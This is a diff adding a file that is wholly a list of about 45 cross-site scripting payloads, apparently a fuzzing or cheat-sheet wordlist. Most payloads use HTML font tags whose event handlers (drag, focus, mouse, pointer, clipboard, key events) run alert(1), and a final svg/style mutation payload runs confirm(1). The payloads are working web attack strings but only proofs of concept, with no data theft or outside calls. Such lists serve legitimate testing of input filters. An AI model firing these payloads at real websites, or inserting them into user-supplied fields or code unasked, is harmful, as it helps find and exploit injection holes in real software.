@@ -1,0 +1,45 @@
+<font draggable="true" ondrag="alert(1)">test</font>
+<font draggable="true" ondragend="alert(1)">test</font>
+<font draggable="true" ondragenter="alert(1)">test</font>
+<font draggable="true" ondragleave="alert(1)">test</font>
+<font draggable="true" ondragstart="alert(1)">test</font>
+<font id=x tabindex=1 onactivate=alert(1)></font>
+<font id=x tabindex=1 onbeforeactivate=alert(1)></font>
+<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>
+<font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>
+<font id=x tabindex=1 onfocus=alert(1)></font>
+<font id=x tabindex=1 onfocusin=alert(1)></font>
+<font onafterscriptexecute=alert(1)><script>1</script>
+<font onbeforecopy="alert(1)" contenteditable>test</font>
+<font onbeforecut="alert(1)" contenteditable>test</font>
+<font onbeforepaste="alert(1)" contenteditable>test</font>
+<font onbeforescriptexecute=alert(1)><script>1</script>
+<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>
+<font onclick="alert(1)">test</font>
+<font oncontextmenu="alert(1)">test</font>
+<font oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<font oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<font ondblclick="alert(1)" autofocus tabindex=1>test</font>
+<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>
+<font onkeydown="alert(1)" contenteditable>test</font>
+<font onkeypress="alert(1)" contenteditable>test</font>
+<font onkeyup="alert(1)" contenteditable>test</font>
+<font onmousedown="alert(1)">test</font>
+<font onmouseenter="alert(1)">test</font>
+<font onmouseleave="alert(1)">test</font>
+<font onmousemove="alert(1)">test</font>
+<font onmouseout="alert(1)">test</font>
+<font onmouseover="alert(1)">test</font>
+<font onmouseup="alert(1)">test</font>
+<font onmousewheel=alert(1)>requires scrolling
+<font onpaste="alert(1)" contenteditable>test</font>
+<font onpointerdown=alert(1)>XSS</font>
+<font onpointerenter=alert(1)>XSS</font>
+<font onpointerleave=alert(1)>XSS</font>
+<font onpointermove=alert(1)>XSS</font>
+<font onpointerout=alert(1)>XSS</font>
+<font onpointerover=alert(1)>XSS</font>
+<font onpointerrawupdate=alert(1)>XSS</font>
+<font onpointerup=alert(1)>XSS</font>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+
